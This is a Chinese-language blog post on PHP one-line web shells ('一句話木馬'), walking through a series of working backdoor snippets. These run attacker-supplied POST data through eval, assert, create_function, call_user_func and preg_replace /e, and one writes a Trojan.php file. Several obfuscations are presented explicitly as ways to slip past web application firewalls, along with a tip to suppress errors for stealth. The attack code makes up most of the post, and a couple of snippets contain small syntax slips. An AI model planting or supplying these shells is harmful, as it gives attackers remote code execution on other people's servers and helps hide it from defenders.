---
layout: post
title: "[PHP]一句話木馬"
date: 2018-12-18 01:25:20 +0800
categories: [php,web,security]
tags: [php,web,security]
---

## 什麼是一句話木馬

**一句話木馬就是只需要一行代碼的木馬，短短一行代碼，就能做到和大馬相當的功能。為了繞過waf的檢測，一句話木馬出現了無數中變形，但本質是不變的：木馬的函數執行了我們發送的命令。**

**我們如何發送命令，發送的命令如何執行？
我們可以通過`GET` 、`POST` 、`COOKIE`這三種方式向一個網站提交數據，一句話木馬用`$_GET[' ']`、`$_POST[' ']`、`$_COOKIE[' '] `接收我們傳遞的數據，並把接收的數據傳遞給一句話木馬中執行命令的函數，進而執行命令。
所以看到的經典一句話木馬大多都是只有兩個部分，一個是可以執行代碼的函數部分，一個是接收數據的部分。**
例如：
```php
<?php eval(@$_POST['a']); ?>
```
其中eval就是執行命令的函數，`$_POST['a']`就是接收的數據。 eval函數把接收的數據當作PHP代碼來執行。這樣我們就能夠讓插入了一句話木馬的網站執行我們傳遞過去的任意PHP語句。這便是一句話木馬的強大之處。

---

### **使用 其他函數製作一句話木馬**

#### **assert函數**
```php
<?php assert(@$_POST['a']); ?>
```
---

#### **create_function函數**
```php
<?php
$fun = create_function('',$_POST['a']);
$fun();
?>
```

把用戶傳遞的資料形成一個函數fun()，然後再執行fun()

---

#### **call_user_func回調函數**
```php
<?php
@call_user_func(assert,$_POST['a']);
?>
```

`call_user_func`這個函數可以呼叫其它函數，被呼叫的函數是`call_user_func`的第一個函數，被呼叫的函數的參數是`call_user_func`的第二個參數。
<br />
這樣的一個語句也可以完成一句話木馬。一些被waf攔截的木馬可以配合這個函數繞過waf。

---

#### **preg_replace函數**
```php
<?php
@preg_replace("/abcde/e", $_POST['a'], "abcdefg");
?>
```

這個函數原本是利用正則表達式替換符合條件的字符串，但是這個函數有一個功能——可執行命令。這個函數的第一個參數是正則表達式，按照PHP的格式，表達式在兩個"/"之間。如果我們在這個表達式的末尾加上"e"，那麼這個函數的第二個參數就會被當作代碼執行。

---

#### **file_put_contents函數**

#### 利用函數生成木馬

```php
<?php
$test='<?php $a=$_POST["cmd"];assert($a); ?>';
file_put_contents("Trojan.php", $test);
?>
```
函數功能：產生一個文件，第一個參數是文件名，第二個參數是文件的內容。

---

### 讓一句話木馬繞過waf


#### **PHP變數函數**
```php
<?php
$a = "eval";
$a(@$_POST['a']);
?>
```
第三行使用了變數函數$a，變數儲存了函數名eval，便可以直接用變數替代函數名。

---

#### **PHP可變變數**
```php
<?php
$bb="eval";
$a="bb";
$$aa($_POST['a']);
?>
```

看這句就能理解上述語句：`$$aa = $($aa) = $ (‘bb’) = $bb = "eval"`

---

#### **str_replace函數**
```php
<?php
$a=str_replace("Waldo", "", "eWaldoval");
$a(@$_POST['a']);
?>
```

函數功能：在第三個參數中，查找第一個參數，並替換成第二個參數。這裡第二個參數為空字符串，就相當於刪除"Waldo"。

---

#### **base64_decode函數**
```php
<?php
$a=base64_decode("ZXZhbA==")
$a($_POST['a']);
?>
```

這裡是base64解密函數，"ZXZhbA=="是eval的base64加密。

---

### **"."操作符號**
```php 
<?php
$a="e"."v";
$b="a"."l";
$c=$a.$b;
$c($_POST['a']);
?>
```
---

### **parse_str函數**
```php
<?php
$str="a=eval";
parse_str($str);
$a($_POST['a']);
?>
```
執行這個函數後，生成一個變數$a，值為字符串"eval"

---

### **更多技巧...**
`多實戰，多Google！`

上述六種技巧每一種單獨使用都不能繞過waf，但是與 第三大點提到的函數混合起來使用，就可以順利的欺騙waf。
`tips：使用一句話木馬的時候可以在函數前加”@”符，這個符號讓php語句不顯示錯誤信息，增加隱蔽性。`

---

### **再來一個小栗子**
```php
<?php
function fun()
{return $_POST['a'];}
@preg_replace("/test/e",fun(),"test test test");
?>
```
這裡又有一個技巧，創建函數 fun()，返回post中"a"的數據。

資料來源<br />
[PHP之一句話木馬](https://xz.aliyun.com/t/2786)